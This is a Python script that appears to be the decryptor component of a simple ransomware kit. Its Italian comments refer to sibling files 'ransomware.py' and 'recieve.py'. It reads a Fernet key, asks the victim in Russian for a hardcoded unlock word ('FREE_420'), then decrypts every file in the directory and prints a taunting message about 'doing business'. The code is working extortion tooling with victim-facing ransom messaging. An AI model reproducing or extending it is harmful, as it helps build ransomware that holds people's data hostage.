import os
from cryptography.fernet import Fernet

files = []

try:
    # Prende ogni file nella directory corrente
    for file in os.listdir():
        # Salta i file se sono i seguenti:
        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "recieve.py":
            continue
        # Aggiunge i file target alla lista
        files.append(file)

    directory = os.path.dirname(os.path.abspath(__file__))
    key_file_path = os.path.join(directory, "thekey.key")

    if os.path.isfile(key_file_path):
        # Legge la chiave segreta dal file della chiave
        with open(key_file_path, "rb") as key_file:
            secret_key = key_file.read()

        parola_magica = "FREE_420"

        frase_utente = input("Введите здесь волшебное слово, которое мы вам дали: \n")

        if parola_magica == frase_utente:
            # Decifra ogni file utilizzando la chiave segreta
            for filename in files:
                # Legge tutti i file
                with open(filename, "rb") as thefile:
                    contents = thefile.read()
                # Utilizza la funzione di Fernet per decifrare i file
                contents_decrypted = Fernet(secret_key).decrypt(contents)
                # Riscrive i testi in chiaro nei vari file
                with open(filename, "wb") as thefile:
                    thefile.write(contents_decrypted)
            print("Все ваши данные были расшифрованы. Было очень приятно иметь с вами дело!")
        else:
            print("Ошибка: Неправильное волшебное слово. Невозможно провести расшифровку.")
    else:
        print("Ошибка: Файл секретного ключа не найден. Невозможно провести расшифровку.")
except Exception as e:
    print(f"Произошла ошибка: {str(e)}")
